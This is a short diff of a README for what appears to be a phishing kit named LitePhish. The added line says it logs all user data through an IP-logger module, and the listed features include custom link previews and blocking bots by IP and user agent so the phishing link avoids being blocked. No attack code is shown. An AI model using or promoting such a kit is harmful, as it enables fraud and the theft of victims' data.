@@ -29,6 +29,7 @@
 - <del>Link with custom preview(image + title + description) when shared on any website.</del>
 - <del>Admin login</del> panel has been created for absolute dummies.
 - Detect bots by their IP & UserAgent and block them to prevent link blockage..
+- Logs all user data using [iplogger](modules/iplogger.php)
 
 ## Usage
 `git clone https://github.com/DarkSecDevelopers/LitePhish.git`
